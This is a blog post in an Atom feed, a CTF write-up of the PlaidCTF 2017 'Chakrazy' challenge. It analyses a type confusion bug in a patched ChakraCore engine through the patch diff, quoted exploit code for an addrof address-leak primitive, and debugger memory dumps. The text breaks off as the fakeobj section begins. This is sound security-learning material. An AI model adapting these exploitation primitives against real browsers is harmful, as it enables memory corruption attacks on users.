<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2018-09-27T00:45:45+08:00</updated><id>http://0.0.0.0:4000/</id><title type="html">Hacking Tube 2.0</title><subtitle>Security and stuff</subtitle><author><name>Bruce Chen</name></author><entry><title type="html">Chakrazy – exploiting type confusion bug in ChakraCore engine</title><link href="http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="alternate" type="text/html" title="Chakrazy -- exploiting type confusion bug in ChakraCore engine" /><published>2017-12-26T19:12:00+08:00</published><updated>2017-12-26T19:12:00+08:00</updated><id>http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore</id><content type="html" xml:base="http://0.0.0.0:4000/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://ctftime.org/task/4088&quot;&gt;Chakrazy&lt;/a&gt; is a browser CTF challenge created by team PPP for the &lt;a href=&quot;https://ctftime.org/event/439&quot;&gt;2017 PlaidCTF event&lt;/a&gt;. It’s a challenge based on Microsoft’s ChakraCore Javascript engine. You can download the challenge file &lt;a href=&quot;https://drive.google.com/file/d/1aaDLRdl19ffT1-pn_9o4gNTcbR9kwypG/view?usp=sharing&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Similar to my &lt;a href=&quot;https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/&quot;&gt;previous post&lt;/a&gt;, this post is more like a note about how I learn to exploit the type confusion vulnerability in the ChakraCore engine.&lt;/p&gt;

&lt;h2 id=&quot;pre-knowledge&quot;&gt;Pre-knowledge&lt;/h2&gt;

&lt;p&gt;It is recommanded that the reader have some basic knowledge about the type confusion bug and the internal data structures of the ChakraCore engine. Here are some slides from the &lt;a href=&quot;http://conference.hitb.org/hitbsecconf2017ams/materials/D1T2%20-%20Linan%20Hao%20and%20Long%20Liu%20-%20The%20Secret%20of%20ChakraCore.pdf&quot;&gt;360Vulscan team&lt;/a&gt; and &lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Silvanovich-The-Origin-Of-Array-Symbol-Species.pdf&quot;&gt;Natalie@Google Project Zero&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;environment-setting&quot;&gt;Environment Setting&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Ubuntu Linux 16.04 64 bit&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/Microsoft/ChakraCore/tree/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2&quot;&gt;ChakraCore@dd33b4ceaf4b38b44d279d13988ecbd31df46ed2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;GEF debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;building-and-debugging-the-chakracore-engine&quot;&gt;Building and Debugging the ChakraCore engine&lt;/h2&gt;

&lt;p&gt;Building the ChakraCore engine is simple, just follow the instructions in the &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/wiki/Building-ChakraCore&quot;&gt;wiki page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For a Debug build:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd ChakraCore
git reset --hard dd33b4ceaf4b38b44d279d13988ecbd31df46ed2
patch -p1 &amp;lt; ../change.diff # apply the patch
./build.sh --debug
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Later we’ll find the binaries in the &lt;code class=&quot;highlighter-rouge&quot;&gt;out/Debug&lt;/code&gt; directory. If you want a Release build with debug symbols, you’ll have to modified the &lt;code class=&quot;highlighter-rouge&quot;&gt;CMakeLists.txt&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# At line 355

if(NOT CMAKE_BUILD_TYPE STREQUAL Debug)
-    add_compile_options(-O3)
+    add_compile_options(-O0)
+    add_compile_options(-finstrument-functions)
+    add_compile_options(-g)
+    add_compile_options(-ggdb)
else()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I modified the optimization flag to &lt;code class=&quot;highlighter-rouge&quot;&gt;O0&lt;/code&gt; because the &lt;code class=&quot;highlighter-rouge&quot;&gt;O3&lt;/code&gt; flag will optimized out the function parameter and causes some inconvenience during the debug process.&lt;/p&gt;

&lt;p&gt;Here I chose to build the Release build with debug symbols, since it’s behavior is more close to the challenge binary ( which is a Release build with the &lt;code class=&quot;highlighter-rouge&quot;&gt;O3&lt;/code&gt; optimization flag ). Later we can just use&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef --args out/Debug/ch exploit.js
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;to debug the binary.&lt;/p&gt;

&lt;h2 id=&quot;analyzing-the-vulnerability--the-patch-&quot;&gt;Analyzing the Vulnerability ( the patch )&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/lib/Runtime/Library/JavascriptArray.cpp b/lib/Runtime/Library/JavascriptArray.cpp
index a666b0b..0e8a073 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/lib/Runtime/Library/JavascriptArray.cpp
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/lib/Runtime/Library/JavascriptArray.cpp
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -3151,12 +3151,6 @@ namespace Js
&lt;/span&gt;             if (scriptContext-&amp;gt;GetConfig()-&amp;gt;IsES6IsConcatSpreadableEnabled())
             {
                 spreadableCheckedAndTrue = JavascriptOperators::IsConcatSpreadable(aItem) != FALSE;
&lt;span class=&quot;gd&quot;&gt;-                if (!JavascriptNativeIntArray::Is(pDestArray))
-                {
-                    ConcatArgs&amp;lt;uint&amp;gt;(pDestArray, remoteTypeIds, args, scriptContext, idxArg, idxDest, spreadableCheckedAndTrue);
-                    return pDestArray;
-                }
-
&lt;/span&gt;                 if(!spreadableCheckedAndTrue)
                 {
                     pDestArray-&amp;gt;SetItem(idxDest, aItem, PropertyOperation_ThrowIfNotExtensible);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The code is in the &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143&quot;&gt;JavascriptArray::ConcatIntArgs&lt;/a&gt; function, where &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt;’s data type is &lt;strong&gt;“suppose”&lt;/strong&gt; to be &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptNativeIntArray&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here it &lt;strong&gt;removed the code that does the type checking of &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt;&lt;/strong&gt;. There’s no need to do the type checking right ? Since &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt; will always be &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptNativeIntArray&lt;/code&gt; isn’t it ? Well……&lt;/p&gt;

&lt;h2 id=&quot;analyzing-the-exploit&quot;&gt;Analyzing the Exploit&lt;/h2&gt;

&lt;p&gt;We now start analyzing the challenge &lt;a href=&quot;https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba&quot;&gt;exploit code&lt;/a&gt; ( written by &lt;a href=&quot;https://twitter.com/edgarboda&quot;&gt;eboda&lt;/a&gt; ) and see how the exploit works. We’ll focus on the &lt;code class=&quot;highlighter-rouge&quot;&gt;addrof&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;fakeobj&lt;/code&gt; functions, since it’s the most important part of the entire exploit.&lt;/p&gt;

&lt;h3 id=&quot;addrof&quot;&gt;addrof&lt;/h3&gt;
&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;addrof&lt;/code&gt; function is used for leaking an object’s memory address. The most important part are the following code:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;species&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;qq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// here qq is just a JavascriptNativeIntArray&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;qq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// using the species contructor allows us to get a handle on the result array&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// of functions such as map() or concat()&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Here we define a custom getter for the Symbol.isConcatSpreadable property&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// In it we change the type of qq by simply assigning an object to it&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;fakeProp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;qq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// qq was JavascriptNativeIntArray, now changed to JavascriptArray&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}};&lt;/span&gt;

    &lt;span class=&quot;nb&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;defineProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isConcatSpreadable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakeProp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// trigger the vulnerability&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When the line &lt;code class=&quot;highlighter-rouge&quot;&gt;var c = a.concat(b);&lt;/code&gt; was executed, it will first call &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3437&quot;&gt;ArraySpeciesCreate()&lt;/a&gt;, which in this case will return a &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptNativeIntArray&lt;/code&gt; ( line 2~9 ). Then it will goto &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3497&quot;&gt;line 3497&lt;/a&gt; and call &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L3143&quot;&gt;ConcatIntArgs()&lt;/a&gt;, our vulnerability function.&lt;/p&gt;

&lt;p&gt;There’s a for loop inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;ConcatIntArgs()&lt;/code&gt; functions:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idxArg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idxArg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idxArg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aItem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idxArg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spreadableCheckedAndTrue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scriptContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsES6IsConcatSpreadableEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;spreadableCheckedAndTrue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JavascriptOperators&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsConcatSpreadable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spreadableCheckedAndTrue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here the &lt;code class=&quot;highlighter-rouge&quot;&gt;args&lt;/code&gt; stores the array that will be concatenated to &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt;. For instance:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// here pDestArray = c&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// args[0] = a&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// args[1] = b&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;According to the comments of the exploit:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Here we define a custom getter for the Symbol.isConcatSpreadable property&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// In it we change the type of qq by simply assigning an object to it&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;fakeProp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;qq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// qq was JavascriptNativeIntArray, now changed to JavascriptArray&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}};&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// set b's Symbol.isConcatSpreadable to fakeProp&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;defineProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isConcatSpreadable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakeProp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So when &lt;code class=&quot;highlighter-rouge&quot;&gt;aItem&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; and ran to line &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptOperators::IsConcatSpreadable(aItem)&lt;/code&gt;, it will change &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt;’s data type from &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptNativeIntArray&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray&lt;/code&gt;. It’ll also change &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt;’s data type into &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray&lt;/code&gt;, so later it can run to line &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptNativeIntArray::ConvertToVarArray(pDestArray);&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can see that &lt;a href=&quot;https://github.com/Microsoft/ChakraCore/blob/dd33b4ceaf4b38b44d279d13988ecbd31df46ed2/lib/Runtime/Library/JavascriptArray.cpp#L1832&quot;&gt;JavascriptNativeIntArray::ConvertToVarArray&lt;/a&gt;’s first parameter is a &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptNativeIntArray&lt;/code&gt; data type. But here we pass a &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray&lt;/code&gt; data type variable instead, which leads to a &lt;strong&gt;type confusion&lt;/strong&gt; vulnerability.&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;highlighter-rouge&quot;&gt;ConvertToVarArray(pDestArray)&lt;/code&gt; was called, the &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt; has the following memory layout:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  tel 0x00007ffff03d8320
0x00007ffff03d8320│+0x00: 0x0000000300000000
0x00007ffff03d8328│+0x08: 0x0000000000000011
0x00007ffff03d8330│+0x10: 0x0000000000000000
0x00007ffff03d8338│+0x18: 0x00007ffff03d8140  &amp;lt;-- dest[0]
0x00007ffff03d8340│+0x20: 0x0001000000000001  &amp;lt;-- dest[1]
0x00007ffff03d8348│+0x28: 0x0001000000000002  &amp;lt;-- dest[2]
0x00007ffff03d8350│+0x30: 0x8000000280000002
0x00007ffff03d8358│+0x38: 0x8000000280000002
0x00007ffff03d8360│+0x40: 0x8000000280000002
0x00007ffff03d8368│+0x48: 0x8000000280000002
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here &lt;code class=&quot;highlighter-rouge&quot;&gt;dest[0]&lt;/code&gt; stores the object’s address. Since the function “think” that &lt;code class=&quot;highlighter-rouge&quot;&gt;pDestArray&lt;/code&gt; is a &lt;code class=&quot;highlighter-rouge&quot;&gt;JavscriptNativeIntArray&lt;/code&gt;, it will take first three elements ( &lt;code class=&quot;highlighter-rouge&quot;&gt;0xf03d8140&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1&lt;/code&gt; ) and convert them into the form of the &lt;code class=&quot;highlighter-rouge&quot;&gt;JavascriptArray&lt;/code&gt; elements. After the conversion the memory layout will become something like:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  tel 0x00007ffff03d83c0
0x00007ffff03d83c0│+0x00: 0x0000000300000000
0x00007ffff03d83c8│+0x08: 0x0000000000000011
0x00007ffff03d83d0│+0x10: 0x0000000000000000
0x00007ffff03d83d8│+0x18: 0x00010000f03d8140  &amp;lt;-- dest[0] ( dest = c array )
0x00007ffff03d83e0│+0x20: 0x0001000000007fff  &amp;lt;-- dest[1]
0x00007ffff03d83e8│+0x28: 0x0001000000000001  &amp;lt;-- dest[2]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that &lt;code class=&quot;highlighter-rouge&quot;&gt;dest[0]&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;dest[1]&lt;/code&gt; now stores the value of the object’s address ( lower part and upper part ), thus we can leak the object’s memory address by combining &lt;code class=&quot;highlighter-rouge&quot;&gt;c[0]&lt;/code&gt; &amp;amp; &lt;code class=&quot;highlighter-rouge&quot;&gt;c[1]&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;fakeobj&quot;&gt;fakeobj&lt;/h3&gt;
&lt;p&gt;The goal of &lt;code class=&quot;highlighter-rouge&quot;&gt;fakeobj&lt;/code&gt; is to fake a Javascript object at an arbitrary address.&lt;/p&gt;

